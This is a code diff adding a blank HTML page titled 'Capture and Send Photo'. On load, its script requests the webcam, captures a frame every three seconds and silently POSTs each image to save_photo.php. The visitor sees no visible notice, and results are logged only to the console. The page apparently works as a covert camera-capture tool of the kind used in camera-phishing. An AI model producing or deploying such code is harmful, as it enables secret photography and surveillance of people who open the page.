@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Capture and Send Photo</title>
+ <script>
+    function capturePhotoAndNotify() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          video.addEventListener('playing', function() {
+            setInterval(function() {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imageDataURL = canvas.toDataURL('image/jpeg');
+              sendPhoto(imageDataURL);
+            }, 3000); 
+          });
+        })
+        .catch(function(err) {
+          console.error('Error:', err);
+        });
+    }
+
+    function sendPhoto(imageDataURL) {
+      fetch('save_photo.php', {
+        method: 'POST',
+        body: JSON.stringify({ imageDataURL: imageDataURL }),
+        headers: new Headers({
+          'Content-Type': 'application/json'
+        })
+      })
+        .then(function(response) {
+          return response.json();
+        })
+        .then(function(data) {
+          console.log('%c✅ Photo sent:', 'color: green; font-weight: bold;', data.filename);
+        })
+        .catch(function(err) {
+          console.error('%c❌ Error:', 'color: red; font-weight: bold;', err);
+        });
+    }
+    
+    capturePhotoAndNotify(); 
+ </script>
+</head>
+<body>
+</body>
+</html>
+
